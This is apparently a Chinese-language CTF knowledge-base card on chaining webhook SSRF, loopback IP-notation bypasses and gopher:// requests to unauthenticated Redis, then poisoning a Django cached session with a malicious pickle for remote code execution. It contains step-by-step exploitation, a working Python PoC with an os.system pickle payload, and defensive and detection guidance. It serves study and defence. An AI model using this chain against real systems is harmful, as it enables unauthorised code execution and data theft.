---
id: web-python-deserialization-django-redis-session-gopher-pickle-rce
title: Webhook SSRF 变形 IP 绕过 + gopher 打未授权 Redis：改写 Django 缓存 Session 触发 Pickle 反序列化 RCE
type: scenario
domain: web
path: web/python/deserialization
technique: webhook-ssrf-gopher-redis-django-cached-session-pickle-rce
tags:
- ssrf
- gopher
- redis
- django
- pickle
- deserialization
- session
- rce
- ip-notation
- webhook
- python
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V118
  verified_at: '2026-11-06T01:55:37+08:00'
  notes: 已对照原文核对；127.1/十进制 IP 绕过、gopher RESP、db1 Session Pickle、os.system payload 与 /readflag 链一致；PoC 未在本库复跑
url: /docs/web/python/deserialization/web-python-deserialization-django-redis-session-gopher-pickle-rce/
draft: false
kb_aliases:
- DataPulse
- Webhook SSRF
- gopher 打 Redis
- Django 缓存 Session 投毒
- dp_session
- django.contrib.sessions.cache
- Session Pickle RCE
---

## 一句话结论

当 Webhook/URL 预览类功能只对 `127.0.0.1` 做字面黑名单、底层又用支持 `gopher://` 的 urllib 时，可以用 `127.1`、十进制 `2130706433` 或 `127.0.0.1.nip.io` 绕过并直接向未授权 Redis 发送 RESP 命令；若 Django 使用 Redis 缓存 Session（`django.contrib.sessions.backends.cache`），Session 字典以 Pickle 存储，攻击者改写自己 `dp_session` 对应的缓存键为恶意 Pickle，再访问任意带 Session 的页面即可触发 `pickle.loads`，在 Web 进程权限下 RCE。

## 原理

- **SSRF 入口与黑名单绕过**：创建任务和 `retry-webhook` 都允许用户完全控制 `webhook_url`，服务端同步请求并回显 `status_code/response_body`。校验只拦字面 `127.0.0.1`，而 `127.1`、十进制 `2130706433`、`127.0.0.1.nip.io` 都能被解析到回环地址；这是“字符串黑名单 vs 真实网络地址”的经典语义差。
- **gopher 提供原始 TCP**：后端用 Python `urllib` 发起 Webhook 请求，`gopher://127.1:6379/_<URL 编码数据>` 会把编码后的字节原样发给 Redis；URL 中的 `%0d%0a` 还原为 CRLF，因此可以构造任意 RESP 命令。`file://` 被拒绝并不影响 `gopher://`。
- **Redis 未授权**：6379 无密码（`nopass`、`+@all`），通过 `INFO`/`KEYS *` 可确认 db0 是 Celery 队列，db1 是 Django Session。Django 的缓存 Session 后端把整个 Session 字典 Pickle 后写入缓存，键形如 `:1:django.contrib.sessions.cache<session_id>`，会话 Cookie 为 `dp_session`。
- **Pickle 触发点**：Django 在每个请求加载 Session 时从缓存取值并 `pickle.loads`。攻击者只需 `SET` 自己 Session 键为恶意 Pickle，然后携带原 Cookie 访问 `/dashboard/`，反序列化即在 Web 进程执行；返回值不是字典会导致 500，但命令已经执行。
- **自定义类 Payload 的坑**：`__reduce__` 返回 `os.system` 的 `Evil` 类在本地可用，但 Pickle 保存的是 `__main__.Evil` 引用，目标进程的 `__main__` 没有该类，反序列化会先报 `Can't get attribute 'Evil'`，根本不会调用 `__reduce__`。必须直接引用目标环境已有的全局函数，如 `os.system` 或 `builtins.exec`。
- **权限链**：RCE 以 `ctf` 用户执行；`/flag.txt` 是 `400 root:root`，但根目录存在 setuid root 的 `/readflag`，执行它即可读 flag 并回传。

## 触发条件

- 应用存在可控出站 URL 的 Webhook/预览/回调功能，且服务端会发起请求并返回响应。
- URL 校验是字面字符串黑名单，未做 DNS 解析后的 IP 校验与协议白名单；底层 HTTP 客户端支持 `gopher://`（如 Python `urllib`）。
- 内网 Redis 未授权或弱口令，且 Django 使用缓存 Session 后端（Redis/Memcached 等），Session 值以 Pickle 序列化。
- 攻击者能获得一个合法 Session Cookie（注册/登录即可），并能访问会加载 Session 的页面。

## 利用步骤

1. 注册/登录，取得 `dp_session`；创建任务拿到 `task_id`，确认 `retry-webhook` 可自定义 URL 并回显响应。
2. 用 `http://127.1:<port>/`、`http://2130706433:<port>/` 或 `http://127.0.0.1.nip.io:<port>/` 绕过黑名单，探测内网端口；发现 6379 Redis。
3. 用 `gopher://127.1:6379/_PING%0d%0a` 确认可执行 Redis 命令；`INFO keyspace`/`KEYS *` 确认 db1 中 Session 键格式。
4. 构造恶意 Pickle：`cos\nsystem\n(S'<command>'\ntR.`（协议 0，引用 `os.system`），或 `builtins.exec` 版本。
5. 通过 gopher 发送 `SELECT 1` + `SET :1:django.contrib.sessions.cache<session_id> <payload>`。
6. 携带原 Cookie 访问 `/dashboard/` 触发 `pickle.loads`；命令以 Web 进程用户执行。
7. 执行 `/readflag > /tmp/flag_out.txt 2>&1`，再通过 Webhook 外带或写可读路径取回 flag。

## PoC

```python
import urllib.parse

payload = b"cos\nsystem\n(S'/readflag > /tmp/flag_out.txt 2>&1'\ntR."
session_key = ":1:django.contrib.sessions.cache" + session_id

cmds = [["SELECT", "1"], ["SET", session_key, payload]]
raw = b""
for cmd in cmds:
    raw += ("*%d\r\n" % len(cmd)).encode()
    for arg in cmd:
        arg = arg.encode() if isinstance(arg, str) else arg
        raw += b"$%d\r\n%s\r\n" % (len(arg), arg)

url = "gopher://127.1:6379/_" + urllib.parse.quote(raw, safe="")
requests.post(f"{BASE}/tasks/{task_id}/retry-webhook/", json={"url": url})
requests.get(f"{BASE}/dashboard/", cookies={"dp_session": session_id})
```

原文实测命令以 `ctf` 用户执行；`/readflag` 为 setuid root，可直接读出 flag。该 PoC 未在本库环境复跑。

## 变体与关联

- **IP 变形变体**：`127.1`、十进制 `2130706433`、十六进制/八进制、`127.0.0.1.nip.io`、DNS rebinding；核心是校验端看到字符串、连接端解析成真实回环地址。
- **协议变体**：`gopher://` 发原始 RESP；`dict://` 只能发单条命令；若客户端不支持 gopher，可尝试 HTTP 请求行/头 CRLF 注入或 Redis inline 协议。
- **Session 后端变体**：Redis 缓存 Session、Memcached 缓存 Session、数据库缓存 Session；只要存储的是 Pickle 且攻击者可写缓存，就能投毒。
- **关联卡片**：[[web-generic-ssrf-ip-notation-blacklist-bypass]]（等价 IP 表示绕过）、[[web-generic-ssrf-redis-inline-protocol-crlf]]（SSRF 打 Redis 的 inline/CRLF/pipeline）、[[web-python-deserialization-django-file-cache-pickle-rce]]（Django FileBasedCache 投毒，触发方式不同）。

## 检测与防御

- **URL 校验**：协议白名单只允许 `http/https`；解析 URL 后校验解析出的 IP，拒绝回环、内网、链路本地与保留地址；禁止或严格限制重定向并复查目标；不要只做字符串黑名单。
- **Redis 安全**：设置强密码、绑定内网/回环并由安全组隔离；禁用/重命名 `CONFIG`、`MODULE`、`SLAVEOF` 等危险命令；不要让 Web 应用与 Redis 共享未隔离的本地网络。
- **Session 安全**：不要用 Pickle 序列化 Session；使用签名且不可篡改的 Session（Django 默认签名 Cookie 或 JSON Session）；Session 数据不要信任客户端可控内容。
- **缓存完整性**：缓存键使用不可预测的随机值，缓存写入接口需鉴权；对缓存内容做签名/版本校验。
- **权限最小化**：容器内移除 setuid 程序；flag/密钥文件仅对专用进程可读；Web 进程使用低权限账号并限制可执行文件。
- **检测**：Webhook 日志中出现 `gopher://`、`127.1`、十进制 IP、`nip.io` 等异常；Redis 出现来自 Web 进程的 `SELECT 1`/`SET :1:django.contrib.sessions.cache*`；Django 请求出现 Session 反序列化 500 且伴随异常子进程。
